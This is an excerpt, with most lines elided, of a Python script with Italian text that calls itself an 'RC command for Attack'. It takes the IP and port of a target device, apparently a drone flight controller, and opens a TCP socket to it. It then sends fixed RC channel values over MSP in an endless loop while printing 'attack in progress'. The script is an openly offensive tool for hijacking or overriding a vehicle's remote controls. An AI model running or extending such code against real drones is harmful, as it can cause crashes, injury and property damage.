...
def main():
    ...
    print("|_|   \_\      \_ _ _\  ")
    print()
    print("RC command for Attack")
    print()

    parser = argparse.ArgumentParser(
        description='Controllo remoto dei canali RC tramite MSP')
    parser.add_argument(
        '--ip', type=str, help='Indirizzo IP del dispositivo da attaccare')
    parser.add_argument('--port', type=int,
                        help='Porta del dispositivo da attaccare')
    ...
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        ...
        while True:
            ...
            set_rc_channels([1500, 1500, 1500, 1500, 1500], sock)
            print("invio stick in posizione 1500 fisso attacco in corso ")
            time.sleep(1)
